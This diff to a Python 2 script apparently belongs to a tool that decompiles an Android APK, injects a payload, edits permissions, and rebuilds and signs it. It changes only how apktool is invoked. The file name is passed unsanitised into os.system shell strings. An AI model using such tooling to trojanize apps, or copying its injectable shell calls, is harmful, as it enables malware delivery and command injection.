@@ -9,8 +9,8 @@ pyc = pycolor.pyColor()
 
 def decompile(mainapk):
 	print pyc.Info("Decompiling apks...")
-	os.system("./apktool.sh d -f %s"%mainapk)
-	os.system("./apktool.sh d -f temp.apk")
+	os.system("bash apktool.sh d -f %s"%mainapk)
+	os.system("bash apktool.sh d -f temp.apk")
 
 def inject(mainapk):
 	print pyc.Info("Injecting payload...")
@@ -77,7 +77,7 @@ def permissions(mainapk):
 	
 def rebuild(mainapk):
 	print pyc.Info("Recompiling...")
-	rebuild = "./apktool.sh b -f %s"%mainapk.split('.')[0]	
+	rebuild = "bash apktool.sh b -f %s"%mainapk.split('.')[0]	
 	os.system(rebuild)
 	print pyc.Info("Signing apk...")
 	path = "%s/dist/%s"%(mainapk.split('.')[0],mainapk)
